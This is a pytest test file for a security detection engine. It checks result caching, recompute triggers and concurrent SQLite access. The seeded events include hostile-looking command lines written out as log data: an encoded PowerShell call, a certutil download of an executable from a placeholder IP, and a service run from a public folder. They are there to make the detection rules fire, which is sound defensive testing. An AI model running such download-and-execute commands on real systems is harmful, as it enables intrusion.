"""Cached detection runs: same results as a full recompute, recompute only when inputs
change, and concurrent requests neither raise nor all recompute."""

import json
import threading
from datetime import datetime, timedelta, timezone

import pytest
from sqlalchemy import create_engine, event
from sqlalchemy.exc import OperationalError
from sqlalchemy.orm import sessionmaker

from app.db import Base, retry_on_lock, set_sqlite_pragmas
from app.detection import engine as detection_engine
from app.detection import rules as rules_module
from app.detection.engine import run_detection
from app.detection.threat_intel import _observables, extract_observables
from app.models import Detection, Event, Incident, RuleOverride, ThreatIndicator

T0 = datetime(2026, 10, 21, 5, 0, tzinfo=timezone.utc)


def _event(n, event_id, minutes=0, **fields):
    defaults = dict(
        id=f"c{n:07d}-0000-0000-0000-000000000000", source="agent", host="HOST-C", channel="Security",
        provider="p", event_id=event_id, user="bob", process=None, command_line=None,
        message="m", raw="{}", timestamp=T0 + timedelta(minutes=minutes),
    )
    return Event(**{**defaults, **fields})


def _seed_events():
    """A mix that fires several rule kinds: cluster (brute force), filter (encoded
    PowerShell, log cleared, new service) and threat intel (known-bad IP)."""
    events = [_event(i, 4625, minutes=i * 0.1, src_ip="10.0.0.5") for i in range(6)]
    events += [
        _event(10, 4688, 2, process="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
               command_line="powershell.exe -NoProfile -EncodedCommand SQBFAFgA"),
        _event(11, 4688, 3, process="C:\\Windows\\System32\\certutil.exe",
               command_line="certutil.exe -urlcache -f http://203.0.113.10/a.exe a.exe"),
        _event(12, 1102, 5, message="The audit log was cleared."),
        _event(13, 7045, 90, channel="System", message="A service was installed in the system.",
               process="EvilSvc", command_line="C:\\Users\\Public\\evil.exe"),
    ]
    return events


def _snapshot(db):
    detections = sorted(
        (d.id, d.rule_name, d.matched_event_ids, d.risk_score, d.incident_id) for d in db.query(Detection).all()
    )
    incidents = sorted((i.id, i.host, i.risk_score, i.detection_count) for i in db.query(Incident).all())
    return detections, incidents


@pytest.fixture()
def seeded(db_session):
    db_session.add_all(_seed_events())
    db_session.add(ThreatIndicator(type="ip", value="203.0.113.10", source="test", tags=""))
    db_session.commit()
    return db_session


# ---------- same results ----------


def test_cached_result_identical_to_full_recompute(seeded):
    assert run_detection(seeded) is True
    first = _snapshot(seeded)
    assert len(first[0]) >= 4  # several rules fired, so the comparison means something

    assert run_detection(seeded) is False  # nothing changed: served from storage
    assert _snapshot(seeded) == first

    assert run_detection(seeded, force=True) is True
    assert _snapshot(seeded) == first


def test_api_serves_the_same_detections(client, seed_users, seeded):
    run_detection(seeded, force=True)
    expected = sorted(d.id for d in seeded.query(Detection).all())
    login = client.post("/api/auth/login", json={"username": "test_viewer", "password": "TestViewerPass123!"})
    headers = {"Authorization": f"Bearer {login.json()['access_token']}"}
    assert sorted(d["id"] for d in client.get("/api/detections", headers=headers).json()) == expected


def test_cached_observables_equal_uncached(seeded):
    for e in seeded.query(Event).all():
        assert extract_observables(e) == set(_observables.__wrapped__(e.src_ip, e.command_line, e.message))


# ---------- recompute only when inputs change ----------


def test_new_event_triggers_recompute(seeded):
    run_detection(seeded)
    seeded.add(_event(20, 1102, 200, host="HOST-D", message="The audit log was cleared."))
    seeded.commit()
    assert run_detection(seeded) is True
    assert "HOST-D" in {d.host for d in seeded.query(Detection).all()}


def test_deleted_event_triggers_recompute(seeded):
    run_detection(seeded)
    seeded.query(Event).filter(Event.event_id == 1102).delete()
    seeded.commit()
    assert run_detection(seeded) is True
    assert "Security/System event log cleared" not in {d.rule_name for d in seeded.query(Detection).all()}


def test_rule_override_change_triggers_recompute(seeded):
    run_detection(seeded)
    rule = next(r for r in rules_module.RULES if r.name == "Security/System event log cleared")
    seeded.add(RuleOverride(rule_id=rule.id, enabled=False))
    seeded.commit()
    assert run_detection(seeded) is True
    assert rule.name not in {d.rule_name for d in seeded.query(Detection).all()}


def test_threat_intel_change_triggers_recompute(seeded):
    run_detection(seeded)
    seeded.query(ThreatIndicator).delete()
    seeded.commit()
    assert run_detection(seeded) is True
    assert "Known-bad indicator seen" not in {d.rule_name for d in seeded.query(Detection).all()}


def test_rule_list_change_triggers_recompute(seeded):
    # Custom-rule saves and Sigma imports change rules_module.RULES in place, so this does too.
    run_detection(seeded)
    original = list(rules_module.RULES)
    try:
        rules_module.RULES[:] = [r for r in original if r.name != "Security/System event log cleared"]
        assert run_detection(seeded) is True
        assert "Security/System event log cleared" not in {d.rule_name for d in seeded.query(Detection).all()}
    finally:
        rules_module.RULES[:] = original


# ---------- concurrency ----------


@pytest.fixture()
def file_db(tmp_path):
    """A real on-disk SQLite DB with the app's PRAGMAs (the in-memory test DB has one shared connection)."""
    eng = create_engine(f"sqlite:///{tmp_path / 'concurrency.db'}", connect_args={"check_same_thread": False, "timeout": 15})
    event.listen(eng, "connect", set_sqlite_pragmas)
    Base.metadata.create_all(bind=eng)
    Session = sessionmaker(bind=eng, autocommit=False, autoflush=False)
    db = Session()
    db.add_all(_seed_events())
    db.commit()
    db.close()
    yield Session
    eng.dispose()


def test_wal_mode_is_on(file_db):
    db = file_db()
    assert db.connection().exec_driver_sql("PRAGMA journal_mode").scalar() == "wal"
    assert db.connection().exec_driver_sql("PRAGMA busy_timeout").scalar() == 15000
    db.close()


def test_concurrent_requests_do_not_raise_and_recompute_once(file_db, monkeypatch):
    calls = []
    real = detection_engine._recompute
    monkeypatch.setattr(detection_engine, "_recompute", lambda db, fp: (calls.append(1), real(db, fp)))
    errors, results = [], []

    def worker():
        db = file_db()
        try:
            results.append(run_detection(db))
        except Exception as exc:  # noqa: BLE001
            errors.append(exc)
        finally:
            db.close()

    threads = [threading.Thread(target=worker) for _ in range(8)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    assert not errors
    assert len(calls) == 1 and results.count(True) == 1  # the others waited, then used the stored result
    db = file_db()
    assert db.query(Detection).count() >= 4
    db.close()


def test_ingest_during_recompute_does_not_fail(file_db):
    errors = []

    def recompute():
        db = file_db()
        try:
            run_detection(db, force=True)
        except Exception as exc:  # noqa: BLE001
            errors.append(exc)
        finally:
            db.close()

    def ingest(n):
        db = file_db()
        try:
            def store():
                db.add(_event(100 + n, 4625, 300 + n, host="HOST-E"))
                db.commit()
            retry_on_lock(db, store)
        except Exception as exc:  # noqa: BLE001
            errors.append(exc)
        finally:
            db.close()

    threads = [threading.Thread(target=recompute)] + [threading.Thread(target=ingest, args=(n,)) for n in range(5)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    assert not errors
    db = file_db()
    assert db.query(Event).filter(Event.host == "HOST-E").count() == 5
    db.close()


def test_retry_on_lock_retries_then_succeeds(db_session, monkeypatch):
    monkeypatch.setattr("app.db.time.sleep", lambda _s: None)
    attempts = []

    def flaky():
        attempts.append(1)
        if len(attempts) < 3:
            raise OperationalError("INSERT", {}, Exception("database is locked"))
        return "ok"

    assert retry_on_lock(db_session, flaky) == "ok" and len(attempts) == 3


def test_retry_on_lock_does_not_hide_other_errors(db_session):
    def broken():
        raise OperationalError("SELECT", {}, Exception("no such table: nope"))

    with pytest.raises(OperationalError):
        retry_on_lock(db_session, broken)


def test_matched_event_ids_are_json(seeded):
    run_detection(seeded)
    for d in seeded.query(Detection).all():
        assert isinstance(json.loads(d.matched_event_ids), list)
